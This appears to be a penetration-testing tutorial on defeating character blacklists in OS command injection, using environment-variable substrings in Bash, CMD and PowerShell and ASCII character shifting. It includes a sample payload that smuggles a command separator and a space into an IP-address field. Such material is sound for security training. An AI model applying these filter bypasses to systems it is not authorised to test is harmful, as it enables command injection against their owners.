# Bypassing Other Blacklisted Characters

Besides injection operators and space characters, slashes (`/`) and backslashes (`\`) are commonly blacklisted since they're necessary for directory paths. Several techniques can help bypass these filters.

## Linux

### Environment Variable Substring Extraction

Use environment variables with substring extraction to produce blacklisted characters. For example, the `$PATH` variable contains slashes:

```bash
echo ${PATH}
# /usr/local/bin:/usr/bin:/bin:/usr/games

echo ${PATH:0:1}
# /
```

Similarly, extract semicolons from `$LS_COLORS`:

```bash
echo ${LS_COLORS:10:1}
# ;
```

**Tip:** Use `printenv` to explore environment variables and find useful characters.

### Example Payload

Combine environment variables to bypass filters:

```
127.0.0.1${LS_COLORS:10:1}${IFS}
```

This successfully bypasses character filtering by replacing the semicolon and space with environment variable substrings.

## Windows

### Command Prompt (CMD)

Extract characters from Windows variables using substring syntax:

```cmd
echo %HOMEPATH:~6,-11%
# \
```

This extracts a backslash from `%HOMEPATH%` by specifying start position `~6` and end position `-11`.

### PowerShell

Use array indexing on environment variables:

```powershell
$env:HOMEPATH[0]
# \

$env:PROGRAMFILES[10]
# \
```

Alternatively, list all variables with:

```powershell
Get-ChildItem Env:
```

## Character Shifting

For characters not available in environment variables, use character shifting. Find the ASCII character before your target (e.g., `[` before `\`), then shift it:

```bash
man ascii     # \ is 92, [ is 91
echo $(tr '!-}' '"-~'<<<[)
# \
```

PowerShell equivalents exist but are typically longer than Linux commands.
